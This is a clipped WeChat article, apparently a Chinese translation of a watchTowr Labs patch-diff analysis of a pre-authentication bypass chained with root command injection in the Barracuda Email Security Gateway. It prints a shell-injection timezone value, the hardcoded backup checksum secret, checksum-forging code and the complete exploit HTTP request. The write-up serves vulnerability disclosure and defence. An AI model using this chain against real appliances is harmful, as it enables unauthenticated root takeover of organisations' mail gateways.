---
title: 【微信】梭子鱼电子邮件安全网关链无需登录即可实现Root访问
source: https://mp.weixin.qq.com/s/c9xnFHdSD7BI7lN1qhFIyQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-07T16:28:31+08:00
trace_id: e72c1d4d-6238-454e-8022-88bd18a717ca
content_hash: 9bb8be85f39d3dfc384af3dbe7ab09f0f638827bc43f47ee36ddec1bc626da8a
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 41175244-d011-813b-b47d-ec6e2503f4a8
ioc:
  cves:
    - CVE-2023-2868
    - CVE-2026-111560
    - CVE-2026-116606
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

**骨哥说事** *2026年11月7日 12:39*

## 声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。

## 防走失：https://gugesay.com/

**↓ ↓ ↓**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/eddb7ac5af1c4aa4.png)

### 什么是"梭子鱼"（Barracuda）？为什么要说它？必须谈它吗？

梭子鱼（Barracuda）的邮件安全网关解决方案 (ESG) 可不太招人喜欢，这其中缘由颇多：

-   对很多企业而言，它是一台部署在邮件系统前的 **关键安全设备**，负责甄别哪些是垃圾邮件、哪些携带恶意软件、哪些可以"通行无阻"。
    
-   对另一些运维人员来说，这就是那款在UNC4841（据Mandiant报告）利用CVE-2023-2868作为零日漏洞攻击后， **必须强制进行硬件更换的设备**。
    

无论你是哪类用户，有件事儿是确定的：它又是那类部署在网络边界、要"审视"所有流量、却很可能只配备了"刚好够用来拦截一封关于你博客文章的恶意邮件"的权限的设备。

### 好吧，那CVE-2026-116606和CVE-2026-111560到底是什么？

CVE编号总是出人意料的"好记"——这两个也不例外。先来看看Barracuda官方安全公告中的总结：

| CVE编号 | 漏洞类型 | CVSS评分 | 受影响产品范围 | 修复版本 |
| --- | --- | --- | --- | --- |
| CVE-2026-116606 | 认证前身份权限绕过（编者吐槽：哈哈？） | 9.3 (严重) | Barracuda ESG | 9.4.0.029 |
| CVE-2026-111560 | 操作系统命令注入 | 8.6 (高) | ESG，负载均衡ADC，消息归档器，WAF控制中心，Web应用防火墙，Web安全网关 | 9.4.0.029 |

如果单独分开看，你或许可以用英国人那种保守的口吻，说它们"不太理想"。但如果把它们串联起来（指组合利用），再以那种英式思维来评价，可能会说"嗯，还行吧"。这其中的讽刺意味不言而喻。

所以，这两项漏洞会成为今天watchTowr实验室深度技术分析的焦点，也就不足为奇了——让我们泡杯咖啡，细细道来。

### 场景搭建

为了展开今天的完整分析，我们搭建了真实设备环境，并使用我们常规的"这玩意儿到底改了啥"对比流程，对两个版本进行了比对：

-   **存在漏洞的版本**：Barracuda ESG 9.4.0.027
    
-   **已修复的版本**：Barracuda ESG 9.4.0.029
    

在深入细节前，需要补充一个背景：为了修复CVE-2026-111560和CVE-2026-116606，Barracuda发布了多个补丁文件。不过，我们重点分析了其中两个，它们在内部被称为：

-   **补丁-1** （针对CVE-2026-116606 "认证前权限绕过"问题）
    
-   **补丁-2** （针对CVE-2026-111560 操作系统命令注入问题）
    
    ![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5caf571d29377958.png)
    

不得不说，没有什么比因为一个安全漏洞而需要对机架服务器进行"物理驱魔"（强制更换硬件）的往事回忆更让人"暖心"了（好吧，我们也知道背后另有故事）。

### "认证前权限绕过"到底长啥样？（CVE-2026-116606探秘）

这正是我们坐下来要搞清楚的问题。幸运的是，我们并没有等待太久。

在分析补丁-1时，安装脚本至少清晰地说明了它的修补目的：

```
..snip..
# 认证前权限绕过漏洞允许
# 任意触发Spam_Config恢复操作
# CVSS评分 9.8 (严重)
```

细心的读者可能注意到了，这里标注的CVSS分数是9.8分，而Barracuda官方公告中给出的是9.3分。我们推测，9.8分可能是将两个漏洞 **组合评分** 的结果（CVSS专家会立刻认出这种做法"不合规"），而不是此处发生了什么异常。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/64622190c4562ead.png)

深入到这个补丁所修改的文件中，我们很快锁定了一批"嫌疑人"：

-   Index.pm
    
-   Backup2.pm
    
-   bayesian_upload.pm
    
-   UserRole.pm
    
-   Params.pm
    

### 第一个嫌疑人浮出水面：Index.pm

Index.pm文件中的改动虽然微小，却颇为有趣。

Barracuda值得赞扬的一点是，他们在代码注释中（虽然有些含糊）给出了问题线索：

```
+    # 发送错误并在此停止。如果返回一个userrole对象
+    # 将导致response()方法继续运行模块处理器。
```

这条注释体现在整个补丁的核心改动处。补丁前和补丁后的代码对比如下：

```php
if ($password_change_status ==
     $Login::status_codes{ERROR_PASSWD_CHANGE}->{val}) {
-    $params->{json_authenticate} = {
+    $self->audit("failed_password_change", $params->{user});
+    # 发送错误并在此停止。如果返回一个userrole对象
+    # 将导致response()方法继续运行模块处理器。
+    return$self->_bailout_with_json_login_response(
+        $env, $params, {
         success => 'true',
         message => $Login::status_codes{ERROR_PASSWD_CHANGE}->{msg}
                    . ": " . $message,
         status => $Login::status_codes{ERROR_PASSWD_CHANGE}->{val},
-    };
-    return$userrole;
+    });
 }
```

所以， `Index.pm` 这个模块负责处理密码修改请求，但问题就出在修补前的代码中： **当密码修改尝试失败** （状态为 `ERROR_PASSWD_CHANGE` ）时。

下面是存在漏洞的完整函数代码（保留原始文件行号）：

```ruby
383:     if(defined($params->{new_password}) && defined($params->{retype_password}) && ! (-e "/tmp/bypass_password")){
384:         my $password_change_status=0;
385:         my $message = "";
386:         ($password_change_status, $message,$user) = Login::change_admin_password($params);
387:         if($password_change_status == 1 && $user){
388:            # 除非请求来自已通过认证的登录用户，否则不允许其注销
389:             my $url = "/cgi-mod/index.cgi" . uri_hash_to_querystring({
390:                     locale => $MS_globals::params{locale},
391:                     error => $status
392:                 });
393:             my %redir = (-location=>$url);
394:             $self->audit('password_change', $params->{user});
395:             Login::logoff_user($status, 1, $params->{user});
396:             return bailout();
397:         }
398:         else{
399:             if ($password_change_status == $Login::status_codes{ERROR_PASSWD_CHANGE}->{val}) {
400:                 $params->{json_authenticate} = {
401:                     success =>'true',
402:                     message => $Login::status_codes{ERROR_PASSWD_CHANGE}->{msg}.": ". $message,
403:                     status => $Login::status_codes{ERROR_PASSWD_CHANGE}->{val},
404:                 };
405:                 $self->audit("failed_password_change", $params->{user});
406:                 return $userrole;
407:             }
```

修补前的代码虽然返回了一个详细的JSON响应块，告知用户密码修改失败，但它 **并未真正终止程序执行流程**。

我们来剖析一下：

-   当密码修改成功（行387），程序最终在第396行执行 `return bailout();`，这里的 `bailout()` 函数意味着"请求处理完毕， **立即停止处理** "。
    
-   而当密码修改因 `ERROR_PASSWD_CHANGE` 而失败（行399）时，程序却在第406行执行了 `return $userrole;`。
    

接下来的逻辑问题是： **`$userrole` 是什么？** 简单说，它就是当前会话的"角色对象"。对于我们这个未经身份验证的请求，这个角色对象对应的是低权限的"登录页面角色"。

这有什么问题呢？问题在于，上面那段密码修改代码位于 `_process_params` 函数内部，而调用该函数的是 `response` 方法：

```ruby
584: sub response {
585:     my ($self, $env, $params) = @_;
586:
587:     $self->set_self_url($env, $params);
588:
589:     # 如果设备未被激活，此行代码将清除用户可能在参数哈希中尝试的各种修改
590:     # 试图进行的更改操作
591:     $self->_check_activation($env, $params);
592:
593:     $self->_process_params($env, $params);
594:
595:     $self->_update_variables($env, $params);
596:
597:     Barracuda::Hooks::run_hooks("after write config");
```

在第593行， `_process_params` 函数执行完毕，并将 `$userrole` 直接返回给了 `response` 方法——整个函数正常返回，并没有返回任何错误标识，导致程序 **照常继续往下执行**。

要复现这个行为，我们可以向 `/cgi-mod/index.cgi` （这个端点最终会走到上述代码路径）发送一个POST请求，并在请求体中携带两个参数：

-   `new_password`
    
-   `retype_password`
    

```
POST /cgi-mod/index.cgi HTTP/1.1
Host: barracuda.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

user=admin&new_password=one&retype_password=two
```

设备会返回HTTP 200状态码，以及一个宣告密码修改失败的JSON响应体：

```json
{"message":"Error: Password Change: ","no_ajax_redirect":"true","redirect":"/cgi-mod/password_change.cgi?auth_type=Local&locale=en_US&user=admin&error=Error: Password Change: ","success":"true"}
```

"但是等等，"读者可能会问，"一个失败的身份认证操作，难道不应该阻止任何后续需要权限的操作吗？这'登录页面角色'权限能干什么呢？"

别那么天真。

我们现在需要的，就是一个 **能将此漏洞利用价值最大化的"伙伴"漏洞**。而这正是我们要说的下一个安全弱点。

### 幸好，我们还有一个"绝佳拍档"：命令注入漏洞！（CVE-2026-111560解析）

虽然我们已经发现了Barracuda称之为"认证前权限绕过"的异常行为，但还得搞清楚我们能 **用这个漏洞做些什么**。

分析我们称之为"补丁-2"的文件，我们又看到了完整的Perl源代码，这让分析工作轻松了不少。

在这份补丁中，有两个文件格外引人注目：

-   Backup2.pm
    

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/41f26b99db755dd4.png)

### 对比分析Backup2.pm

快速分析后，我们发现Backup2.pm中最关键的修改集中在这个 **存在漏洞的代码块** 上：

```swift
if( -f "/home/product/code/config/tz" ) {
    my $system_timezone = Barracuda::Config::get('system_timezone');
    \`sed -i 's#TZ=.*#TZ=$system_timezone#' /home/product/code/config/tz\`;
}
```

通过对比修补后的代码，我们能更清楚地理解问题的本质。实际上，Barracuda用 **更安全的本地文件读写方式替换了危险的shell命令执行**：

```swift
if( -f "/home/product/code/config/tz" ) {
     my $system_timezone = Barracuda::Config::get('system_timezone');
-    \`sed -i 's#TZ=.*#TZ=$system_timezone#' /home/product/code/config/tz\`;
+    if ($system_timezone && -f "/usr/share/zoneinfo/$system_timezone") {
+        open my $in, '<', '/home/product/code/config/tz' or die $!;
+        my @lines = <$in>;
+        close $in;
+        open my $out, '>', '/home/product/code/config/tz' or die $!;
+        for my $line (@lines) {
+            $line =~ s/^TZ=.*/TZ=$system_timezone/ if$line =~ /^TZ=/;
+            print$out$line;
+        }
+        close $out;
+    } else {
+        warn "Skipping tz restore: invalid system_timezone='$system_timezone'\n";
+    }
 }
```

总结起来，补丁揭示了三个关键点：

1.  **开始进行输入验证**：供应商现在将 `system_timezone` 这个值视为 **不受信任** 的输入，要求它必须能在 `/usr/share/zoneinfo/` 目录下找到对应的真实文件才能使用。
    
2.  **移除了Shell命令执行**：原来那行代码 **跨越了shell边界**。Perl的反引号\\\`\`会执行命令替换，这意味着Perl会构建一个字符串然后将其传递给shell处理。代码里围绕$system_timezone\`值的 **单引号看起来像是保护**，但它们只是最终生成命令行中的普通字符， **并非Perl语言层面的安全边界**。
    
    一个精心构造的值可以 **重写shell命令的语法**，例如：
    
    ```
    Region#';<攻击者命令>;#
    ```
    
    第一个单引号闭合了原本的 `sed` 表达式，分号开启了新的shell命令，而 `#` 符号则注释掉了命令行的剩余部分。
    
3.  **从函数名得到线索**：这是我们真正兴奋起来的部分——函数名 **`finalize_restore`** （"完成恢复操作"）给了我们很大的提示，关于如何利用这个漏洞。
    

### 对比分析fix_tz.pl

补丁分析发现的第二个重要文件是 `fix_tz.pl` ，它讲述了一个与 **时区设置相关的类似命令注入故事**。

```bash
my $system_timezone = Barracuda::Config::get('system_timezone');
exit if !$system_timezone;

\`sed -i 's#ZONE=.*#ZONE=$system_timezone#' /etc/sysconfig/clock\`;
```

实际上，这个文件的补丁同样增加了一个验证逻辑：

```php
my $system_timezone = Barracuda::Config::get('system_timezone');
 exit if !$system_timezone;
+if (! -f "/usr/share/zoneinfo/$system_timezone") {
+    warn "Invalid timezone: $system_timezone\n";
+    exit 1;
+}
```

并且同样移除了shell命令执行，改为Perl直接读写文件的模式：

```swift
-\`sed -i 's#ZONE=.*#ZONE=$system_timezone#' /etc/sysconfig/clock\`;
+if (-f '/etc/sysconfig/clock') {
+    open my $in, '<', '/etc/sysconfig/clock' or die $!;
+    my @lines = <$in>;
+    close $in;
+    open my $out, '>', '/etc/sysconfig/clock' or die $!;
+    for my $line (@lines) {
+        $line =~ s/^ZONE=.*/ZONE=$system_timezone/ if $line =~ /^ZONE=/;
+        print $out $line;
+    }
+    close $out;
+}
```

**长话短说**：我们面对的是 **两个命令注入点**：一个在 `Backup2.pm` 中，另一个在 `fix_tz.pl` 中。

具体来说：

-   `Backup2::finalize_restore` 函数负责写入产品的配置文件（时区设置）
    
-   `fix_tz.pl` 脚本则负责操作操作系统级别的时钟配置文件
    

**并且，攻击者可以用相同的方法操控同一输入数据，同时影响这两个地方。**

可能有读者会质疑："一个低权限的用户不可能写入这些关键系统文件啊！"——这话没错，但我们现在讨论的可是 **特权化的安全设备**，情况完全不同。这正是为什么上面的代码中，执行 `fix_tz.pl` 时会使用 `sudo` 命令：

```
if( -f "/home/product/code/firmware/current/bin/fix_tz.pl" ) {
    system('/usr/bin/sudo',
           '/home/product/code/firmware/current/bin/fix_tz.pl');
}
```

这可不是普通的操作系统命令注入漏洞，而是 **以root (系统最高权限)身份执行** 的漏洞！

### 开始实施利用

为了触发这个漏洞，我们需要找到一个能让代码 **自然执行到这处漏洞点** 的路径。很快，一个名为 `bayesian_upload.pm` 的上传处理程序进入了我们的视线。

看看这个 `bayesian_upload.pm` 文件的核心部分：

```php
53: bc_sub bayesian_upload_handler =>
54:     perm { 1 },
55:     web_params( [param('user'), param('bayesian'), param('pu_bayesian_upload')]),
56:     does {
57:         my $args = shift;
58:         returnif(!defined($args->{'bayesian'}) || $ENV{REMOTE_USER} eq 'guest');
59:
60:         my $lock;
61:         my $error = '';
62:         my $filename = $Barracuda::BackupConfig::StagingJob::BACKUP_FILE;
63:
64:         try {
65:             $lock = Barracuda::Backup2::_grab_lock();
66:
67:             my $uploader = $args->{bayesian};
68:             if ($uploader->to_file( { dest => $filename } )) {
69:                 throw Barracuda::Exception;
70:            }
71:         }
<中间部分省略...>
94:         try {
95:             $ret = Barracuda::Backup2::restore_all($filename, %params);
96:         } catch Error with {
```

如你所见，这个函数逻辑很直接。它接收几个参数，只要条件满足，就会执行到第95行，那里调用 `restore_all` 函数来处理用户上传的备份文件。

### 利用"备份恢复"功能实现命令执行

说起来简单，但 **构建一个有效的攻击载荷** 可没那么容易。我们首先要搞清楚："备份文件到底长什么样？"

幸运的是，在这个案例中，备份文件其实是一个tar压缩包，里面包含一个关键的\*\* `backup.xml` \*\*文件，这个文件描述了备份内容的详细信息。我们构建了一个示例结构：

```html
<backup>
  <component name="Spam_Config">
    <file id="mysql" checksum="[此处为生成的校验和]" path="mysql-poc.gz" />
  </component>
  <info filename="poc.bak" firmware_version="9.4.0.020"
        model="V300" platform="5" product="emailswitch" type="manual_backup">
    <component_version name="Config" number="1" />
    <component_version name="Files" number="1" />
    <component_version name="Spam_Config" number="1" />
    <component_version name="mysql" number="1" />
  </info>
</backup>
```

眼尖的读者可能注意到了， `Spam_Config` 这个组件名，与之前补丁中注释提到的完全一致。这就是 **关键线索**！它是一个包含在 `backup.xml` 文件中的组件。

当设备恢复 `Spam_Config` 组件时，它会加载一个小的MySQL转储文件，并将其中定义的数据恢复到本地MySQL数据库中。

凑巧的是，被恢复的数据中 **有一行正是 `system_timezone`**。你猜到我们想干什么了吗？

如果我们把 `system_timezone` 这一行的值修改为这样，会发生什么：

```
UTC#';touch /tmp/watchTowr;#
```

但别高兴太早——我们还得 **先构建出一个合法的备份文件** 才行。

### 让我们的恶意备份"合法"通过

如前所述，备份恢复由名为 `restore_all` 的函数处理。这个函数会解压备份包，读取恢复列表，然后逐一恢复各个组件。

不过，我们遇到了一个 **安全校验障碍**。

### 那棘手的校验和

`backup.xml` 中列出的每个文件都包含一个 `checksum` （校验和）属性，恢复函数会 **严格验证** 这个校验和。它会读取文件的原始字节，计算自己的校验和，如果两者不匹配，则会 **直接拒绝恢复操作**。所以，我们以往"随便填几个数字"的老办法在这里行不通。

但这里有个 **非常有趣的发现**：校验和的计算方式居然是：

```
md5(文件字节 + 秘密字符串 + ".")
```

**秘密字符串？** 你可能会以为，这应该是一个 **动态变化、与设备绑定、难以预测** 的值。

但我们发现的"秘密"是：

```
CHECKSUM_SECRET = b"Barracuda Networks is your new best friend"
```

校验和的实际计算方式就是：md5(文件字节 + "Barracuda Networks is your new best friend" + ".")

知道了这个，我们就能 **自己计算出合法的校验和**：

```html
47:     mysql_dump = gzip.compress(sql, compresslevel=9, mtime=0)
48:     checksum = hashlib.md5(mysql_dump + CHECKSUM_SECRET + b".").hexdigest()
49:     timestamp = time.strftime("%Y%m%dT%H%M%S", time.gmtime())
50:     backup_xml = f"""<?xml version='1.0' standalone='yes'?>
51: <backup>
52:   <component name="Spam_Config">
53:     <file id="mysql" checksum="{checksum}" path="mysql-poc.gz" />
```

### 最终组合攻击链

虽然"字数多意味着文章长"是句老话，但令人意外的是， **将今天文章中讨论的两个漏洞串联起来进行完整利用的HTTP请求，其实相当简洁**：

```haskell
POST /cgi-mod/index.cgi HTTP/1.1
Host: barracuda.com
Content-Type: multipart/form-data; boundary=BOUNDARY

--BOUNDARY
Content-Disposition: form-data; name="user"

admin
--BOUNDARY
Content-Disposition: form-data; name="new_password"

one
--BOUNDARY
Content-Disposition: form-data; name="retype_password"

two
--BOUNDARY
Content-Disposition: form-data; name="UPDATE_activation_code"

1
--BOUNDARY
Content-Disposition: form-data; name="pu_bayesian_upload"

1
--BOUNDARY
Content-Disposition: form-data; name="bayesian"; filename="poc.bak"
Content-Type: application/octet-stream

<TAR备份文件内容>
--BOUNDARY--
```

### 检测样本生成器

和往常一样，我们分享了我们的 **检测样本生成器**，以便在你的环境中评估受影响程度并制定修复计划。

你可以在我们的GitHub页面找到相关代码和工具。

PoC：https://github.com/watchtowrlabs/watchTowr-vs-Barracuda-RCE-CVE-2026-116606-CVE-2026-111560

原文：https://labs.watchtowr.com/barracuda-networks-is-your-new-best-friend-barracuda-email-security-gateway-pre-auth-remote-root-rce-cve-2026-116606-cve-2026-111560/

\- END -

**感谢阅读，如果觉得还不错的话，动动手指给个三连吧～**

漏洞 · 目录
